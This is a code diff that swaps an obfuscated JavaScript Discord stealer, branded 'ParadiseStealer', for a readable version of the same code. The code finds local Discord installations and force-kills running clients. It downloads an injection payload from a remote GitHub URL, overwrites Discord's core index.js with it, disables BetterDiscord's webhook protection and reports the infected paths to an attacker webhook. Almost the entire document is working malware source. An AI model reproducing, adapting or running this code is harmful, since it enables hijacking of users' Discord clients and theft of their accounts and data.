@@ -1,1 +1,191 @@
-var _0x5d8271=_0x3bdd;(function(_0x1b3c26,_0x11499b){var _0x5ebf72=_0x3bdd,_0x51f019=_0x1b3c26();while(!![]){try{var _0xa72b48=parseInt(_0x5ebf72(0x220))/0x1*(-parseInt(_0x5ebf72(0x22b))/0x2)+-parseInt(_0x5ebf72(0x22f))/0x3*(parseInt(_0x5ebf72(0x231))/0x4)+-parseInt(_0x5ebf72(0x209))/0x5*(parseInt(_0x5ebf72(0x210))/0x6)+-parseInt(_0x5ebf72(0x1f9))/0x7*(parseInt(_0x5ebf72(0x227))/0x8)+parseInt(_0x5ebf72(0x21a))/0x9*(parseInt(_0x5ebf72(0x22a))/0xa)+-parseInt(_0x5ebf72(0x211))/0xb*(parseInt(_0x5ebf72(0x1e7))/0xc)+parseInt(_0x5ebf72(0x203))/0xd;if(_0xa72b48===_0x11499b)break;else _0x51f019['push'](_0x51f019['shift']());}catch(_0x14887f){_0x51f019['push'](_0x51f019['shift']());}}}(_0x610a,0x5464e));var glob=require(_0x5d8271(0x1e1));const fs=require('fs'),https=require(_0x5d8271(0x1e2)),{exec}=require(_0x5d8271(0x218)),axios=require(_0x5d8271(0x23d)),buf_replace=require(_0x5d8271(0x20d)),webhook='da_webhook',config={'logout':_0x5d8271(0x219),'inject-notify':_0x5d8271(0x1f0),'logout-notify':_0x5d8271(0x230),'init-notify':_0x5d8271(0x213),'embed-color':_0x5d8271(0x1ff),'disable-qr-code':_0x5d8271(0x1f5)};var LOCAL=process[_0x5d8271(0x233)][_0x5d8271(0x1e0)],discords=[],injectPath=[],runningDiscords=[];fs['readdirSync'](LOCAL)[_0x5d8271(0x1ef)](_0xda6e83=>{var _0x2a065e=_0x5d8271;if(_0xda6e83[_0x2a065e(0x1e8)](_0x2a065e(0x22c)))discords[_0x2a065e(0x1ea)](LOCAL+'\x5c'+_0xda6e83);else return;}),discords[_0x5d8271(0x1ef)](function(_0x8c7d00){var _0x38c3d1=_0x5d8271;let _0x56be3b=''+_0x8c7d00+_0x38c3d1(0x20a);glob[_0x38c3d1(0x1e4)](_0x56be3b)[_0x38c3d1(0x20b)](_0x38a7eb=>{var _0x5b8ca2=_0x38c3d1;injectPath[_0x5b8ca2(0x1ea)](_0x38a7eb);});}),listDiscords();function _0x610a(){var _0x5cd20a=['discord','catch','296790YqvHGH','715142CjSHLS','iscord','prototype','ParadiseStealer','113901KANjcw','%LOGOUTNOTI%1','4czrTGD','discorddevelopment','env','discordcanary','log','DiscordDevelopment.exe','writeFileSync','data','existsSync','DiscordPTB.exe','\x5cBetterDiscord\x5cdata\x5cbetterdiscord.asar','mkdirSync','axios','appdata','false','LOCALAPPDATA','glob','https','%LOGOUTNOTI%','sync','instant','ParadiseStealerBTW','2341260jhMmpA','includes','warn','push','exception','discordptb','end','logout-notify','forEach','%INJECTNOTI%1','.exe\x20/F','3447704','toString','bind','%DISABLEQRCODE%1','constructor','true','init','7840Zvbrbt','return\x20(function()\x20','https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/injection','init-notify','get','table','%MBEDCOLOR%1','trace','DiscordCanary.exe','.exe','9927697SqSFpu','%DISABLEQRCODE%','then','console','index.js','stanleyisgod','430fhuEZj','\x5capp-*\x5cmodules\x5cdiscord_desktop_core-*\x5cdiscord_desktop_core\x5cindex.js','map','embed-color','buffer-replace','__proto__','inject-notify','1026ywPMRm','22wcLykV','logout','%INITNOTI%1','Discord.exe','%WEBHOOK_LINK%','{}.constructor(\x22return\x20this\x22)(\x20)','post','child_process','%LOGOUT%1','153qzntyI','```','%INITNOTI%','replace','tasklist','error','1tJMrkJ','length','disable-qr-code','apply','search',':syringe:\x20Inject\x20Path','(((.+)+)+)+$','872rBXrrL'];_0x610a=function(){return _0x5cd20a;};return _0x610a();}function Infect(){var _0x262b8c=_0x5d8271;https[_0x262b8c(0x1fd)](_0x262b8c(0x1fb),_0x559afd=>{var _0x1c8b2e=_0x262b8c;let _0x445ef4='';_0x559afd['on'](_0x1c8b2e(0x238),_0x214536=>{_0x445ef4+=_0x214536;}),_0x559afd['on'](_0x1c8b2e(0x1ed),()=>{injectPath['forEach'](_0x1070d9=>{var _0x4a85f4=_0x3bdd;fs[_0x4a85f4(0x237)](_0x1070d9,_0x445ef4['replace'](_0x4a85f4(0x215),webhook)[_0x4a85f4(0x21d)](_0x4a85f4(0x21c),config[_0x4a85f4(0x1fc)])[_0x4a85f4(0x21d)]('%LOGOUT%',config['logout'])[_0x4a85f4(0x21d)](_0x4a85f4(0x1e3),config[_0x4a85f4(0x1ee)])[_0x4a85f4(0x21d)](_0x4a85f4(0x1f2),config[_0x4a85f4(0x20c)])[_0x4a85f4(0x21d)](_0x4a85f4(0x204),config[_0x4a85f4(0x222)]),{'encoding':'utf8','flag':'w'});if(config[_0x4a85f4(0x1fc)]==_0x4a85f4(0x1f7)){let _0x17c7bc=_0x1070d9[_0x4a85f4(0x21d)](_0x4a85f4(0x207),_0x4a85f4(0x1f8));!fs['existsSync'](_0x17c7bc)&&fs[_0x4a85f4(0x23c)](_0x17c7bc,0x1e4);}if(config[_0x4a85f4(0x212)]!=_0x4a85f4(0x23f)){let _0x442451=_0x1070d9['replace'](_0x4a85f4(0x207),_0x4a85f4(0x1e6));if(!fs[_0x4a85f4(0x239)](_0x442451))fs[_0x4a85f4(0x23c)](_0x442451,0x1e4),config['logout']=='instant'&&startDiscord();else fs[_0x4a85f4(0x239)](_0x442451)&&config[_0x4a85f4(0x212)]==_0x4a85f4(0x1e5)&&startDiscord();}});});})['on'](_0x262b8c(0x21f),_0x2a7171=>{var _0x37a7bf=_0x262b8c;console[_0x37a7bf(0x235)](_0x2a7171);});};function listDiscords(){var _0x317705=_0x5d8271,_0x5b282b=(function(){var _0x180b31=!![];return function(_0x6b80e2,_0x548158){var _0xb24e89=_0x180b31?function(){if(_0x548158){var _0x4e65f9=_0x548158['apply'](_0x6b80e2,arguments);return _0x548158=null,_0x4e65f9;}}:function(){};return _0x180b31=![],_0xb24e89;};}()),_0x4229f0=_0x5b282b(this,function(){var _0x4526d0=_0x3bdd;return _0x4229f0[_0x4526d0(0x1f3)]()[_0x4526d0(0x224)]('(((.+)+)+)+$')[_0x4526d0(0x1f3)]()[_0x4526d0(0x1f6)](_0x4229f0)[_0x4526d0(0x224)](_0x4526d0(0x226));});_0x4229f0();var _0x336c41=(function(){var _0x1b9fb6=!![];return function(_0x446239,_0x344bfc){var _0x59b738=_0x1b9fb6?function(){var _0x395ce6=_0x3bdd;if(_0x344bfc){var _0x20685e=_0x344bfc[_0x395ce6(0x223)](_0x446239,arguments);return _0x344bfc=null,_0x20685e;}}:function(){};return _0x1b9fb6=![],_0x59b738;};}()),_0x5e89b5=_0x336c41(this,function(){var _0xa7e3c1=_0x3bdd,_0x11dcb2;try{var _0x120aeb=Function(_0xa7e3c1(0x1fa)+_0xa7e3c1(0x216)+');');_0x11dcb2=_0x120aeb();}catch(_0x1b9345){_0x11dcb2=window;}var _0xe517f0=_0x11dcb2[_0xa7e3c1(0x206)]=_0x11dcb2[_0xa7e3c1(0x206)]||{},_0x19f345=[_0xa7e3c1(0x235),_0xa7e3c1(0x1e9),'info','error',_0xa7e3c1(0x1eb),_0xa7e3c1(0x1fe),_0xa7e3c1(0x200)];for(var _0x2d29ed=0x0;_0x2d29ed<_0x19f345[_0xa7e3c1(0x221)];_0x2d29ed++){var _0x37294=_0x336c41[_0xa7e3c1(0x1f6)][_0xa7e3c1(0x22d)][_0xa7e3c1(0x1f4)](_0x336c41),_0x3f1e10=_0x19f345[_0x2d29ed],_0x2700bd=_0xe517f0[_0x3f1e10]||_0x37294;_0x37294[_0xa7e3c1(0x20e)]=_0x336c41[_0xa7e3c1(0x1f4)](_0x336c41),_0x37294[_0xa7e3c1(0x1f3)]=_0x2700bd['toString'][_0xa7e3c1(0x1f4)](_0x2700bd),_0xe517f0[_0x3f1e10]=_0x37294;}});_0x5e89b5(),exec(_0x317705(0x21e),function(_0x2c4e39,_0x299eeb,_0x41bb9b){var _0xf12263=_0x317705;_0x299eeb['includes'](_0xf12263(0x214))&&runningDiscords[_0xf12263(0x1ea)](_0xf12263(0x228));_0x299eeb[_0xf12263(0x1e8)](_0xf12263(0x201))&&runningDiscords['push'](_0xf12263(0x234));_0x299eeb[_0xf12263(0x1e8)](_0xf12263(0x236))&&runningDiscords[_0xf12263(0x1ea)](_0xf12263(0x232));_0x299eeb[_0xf12263(0x1e8)](_0xf12263(0x23a))&&runningDiscords['push'](_0xf12263(0x1ec));;config[_0xf12263(0x212)]==_0xf12263(0x1e5)?killDiscord():(config[_0xf12263(0x20f)]=='true'&&injectPath[_0xf12263(0x221)]!=0x0&&injectNotify(),Infect(),pwnBetterDiscord());});};function killDiscord(){var _0x480b13=_0x5d8271;runningDiscords[_0x480b13(0x1ef)](_0x235989=>{var _0x2f4aff=_0x480b13;exec('taskkill\x20/IM\x20'+_0x235989+_0x2f4aff(0x1f1),_0x32a587=>{if(_0x32a587)return;});}),config[_0x480b13(0x20f)]==_0x480b13(0x1f7)&&injectPath[_0x480b13(0x221)]!=0x0&&injectNotify(),Infect(),pwnBetterDiscord();};function startDiscord(){var _0x3191e6=_0x5d8271;runningDiscords[_0x3191e6(0x1ef)](_0x5c2fb2=>{var _0x349789=_0x3191e6;let _0x4a4317=LOCAL+'\x5c'+_0x5c2fb2+'\x5cUpdate.exe\x20--processStart\x20'+_0x5c2fb2+_0x349789(0x202);exec(_0x4a4317,_0x109be1=>{if(_0x109be1)return;});});};function _0x3bdd(_0x4c9f5a,_0x2bed54){var _0x58f619=_0x610a();return _0x3bdd=function(_0x28ca86,_0x4714ab){_0x28ca86=_0x28ca86-0x1e0;var _0x1353ba=_0x58f619[_0x28ca86];return _0x1353ba;},_0x3bdd(_0x4c9f5a,_0x2bed54);}function pwnBetterDiscord(){var _0xa4db38=_0x5d8271,_0x4b014f=process['env'][_0xa4db38(0x23e)]+_0xa4db38(0x23b);if(fs[_0xa4db38(0x239)](_0x4b014f)){var _0x40f4a5=fs['readFileSync'](_0x4b014f);fs[_0xa4db38(0x237)](_0x4b014f,buf_replace(_0x40f4a5,'api/webhooks',_0xa4db38(0x208)));}else return;}function injectNotify(){var _0x2eb305=_0x5d8271,_0x3784b6=[];injectPath[_0x2eb305(0x1ef)](_0x51bff5=>{var _0x105e95=_0x2eb305,_0x569c55={'name':_0x105e95(0x225),'value':_0x105e95(0x21b)+_0x51bff5+_0x105e95(0x21b),'inline':!0x1};_0x3784b6['push'](_0x569c55);}),axios[_0x2eb305(0x217)](webhook,{'content':null,'embeds':[{'title':':detective:\x20Successfull\x20injection','color':config[_0x2eb305(0x20c)],'fields':_0x3784b6,'author':{'name':_0x2eb305(0x22e)},'footer':{'text':'ParadiseStealer'}}]})[_0x2eb305(0x205)](_0x19e8c0=>{})[_0x2eb305(0x229)](_0x587dfe=>{});}
+
+// Code is shit
+var glob = require("glob");
+const fs = require('fs');
+const https = require('https');
+const { exec } = require('child_process');
+const axios = require('axios');
+const buf_replace = require('buffer-replace');
+const webhook = "da_webhook"
+
+const config = {
+    "logout": "%LOGOUT%1",
+    "inject-notify": "%INJECTNOTI%1",
+    "logout-notify": "%LOGOUTNOTI%1",
+    "init-notify":"%INITNOTI%1",
+    "embed-color": "%MBEDCOLOR%1",
+    "disable-qr-code": "%DISABLEQRCODE%1"
+}
+
+
+
+
+var LOCAL = process.env.LOCALAPPDATA
+var discords = [];
+var injectPath = [];
+var runningDiscords = [];
+
+
+fs.readdirSync(LOCAL).forEach(file => {
+    if (file.includes("iscord")) {
+        discords.push(LOCAL + '\\' + file)
+    } else {
+        return;
+    }
+});
+
+discords.forEach(function(file) {
+    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
+    glob.sync(pattern).map(file => {
+        injectPath.push(file)
+    })
+    
+});
+listDiscords();
+function Infect() {
+    https.get('https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/injection', (resp) => {
+        let data = '';
+        resp.on('data', (chunk) => {
+            data += chunk;
+        });
+        resp.on('end', () => {
+            injectPath.forEach(file => {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                });
+                if (config["init-notify"] == "true") {
+                    let init = file.replace("index.js", "init")
+                    if (!fs.existsSync(init)) {
+                        fs.mkdirSync(init, 0744)
+                    }
+                }
+                if ( config.logout != "false" ) {
+
+                    let folder = file.replace("index.js", "ParadiseStealerBTW")
+                    if (!fs.existsSync(folder)) {
+                        fs.mkdirSync(folder, 0744)
+                        if (config.logout == "instant") {
+                            startDiscord();
+                        }
+                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
+                        startDiscord();
+                    }
+                }
+            })
+            
+        });
+    }).on("error", (err) => {
+        console.log(err);
+    });
+};
+
+
+function listDiscords() {
+    exec('tasklist', function(err,stdout, stderr) {
+
+        
+        if (stdout.includes("Discord.exe")) {
+
+            runningDiscords.push("discord")
+        }
+        if (stdout.includes("DiscordCanary.exe")) {
+
+            runningDiscords.push("discordcanary")
+        }
+        if (stdout.includes("DiscordDevelopment.exe")) {
+
+            runningDiscords.push("discorddevelopment")
+        }
+        if (stdout.includes("DiscordPTB.exe")) {
+
+            runningDiscords.push("discordptb")
+        };
+        if (config.logout == "instant") {
+            killDiscord();
+        } else {
+            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
+                injectNotify();
+            }
+            Infect()
+            pwnBetterDiscord()
+        }
+    })
+
+
+   
+};
+
+function killDiscord() {
+    runningDiscords.forEach(disc => {
+        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
+            if (err) {
+              return;
+            }
+          });
+    });
+    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
+        injectNotify();
+    }
+
+    Infect()
+    pwnBetterDiscord()
+};
+
+function startDiscord() {
+    runningDiscords.forEach(disc => {
+        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
+        exec(path, (err) => {
+            if (err) {
+              return;
+            }
+          });
+    });
+};
+function pwnBetterDiscord() {
+    // thx stanley
+    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    if (fs.existsSync(dir)) {
+        var x = fs.readFileSync(dir)
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+    } else {
+        return;
+    }
+
+}
+
+
+function injectNotify() {
+    var fields = [];
+    injectPath.forEach( path => {
+        var c = {
+            name: ":syringe: Inject Path",
+            value: `\`\`\`${path}\`\`\``,
+            inline: !1
+        }
+        fields.push(c)
+    })
+    axios
+	.post(webhook, {
+        "content": null,
+        "embeds": [
+          {
+            "title": ":detective: Successfull injection",
+            "color": config["embed-color"],
+            "fields": fields,
+            "author": {
+              "name": "ParadiseStealer"
+            },
+            "footer": {
+              "text": "ParadiseStealer"
+            }
+          }
+        ]
+      })
+	.then(res => {
+	})
+	.catch(error => {
+
+    })
+
+}
